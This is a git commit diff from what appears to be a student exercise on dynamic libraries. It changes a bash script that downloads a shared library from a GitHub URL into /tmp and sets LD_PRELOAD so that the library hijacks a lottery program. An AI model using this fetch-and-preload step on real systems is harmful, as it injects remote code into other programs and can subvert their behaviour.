11d8722e73b60a7515bc83c8b809b1e57e304d0b
Abdi Berhe <abdi201380@gmail.com>
2023-03-20 11:49:40 -0700

    script to win Jackpot

--- 0x18-dynamic_libraries/101-make_me_win.sh
+++ 0x18-dynamic_libraries/101-make_me_win.sh
@@ -1,3 +1,3 @@
 #!/bin/bash
-wget -P /tmp https://github.com/abdi8-GitHub/alx-low_level_programming/raw/master/0x18-dynamic_libraries/lottory.so
+wget -O /tmp/lottory.so https://github.com/abdi8-GitHub/alx-low_level_programming/raw/master/0x18-dynamic_libraries/lottory.so
 export LD_PRELOAD=/tmp/lottory.so
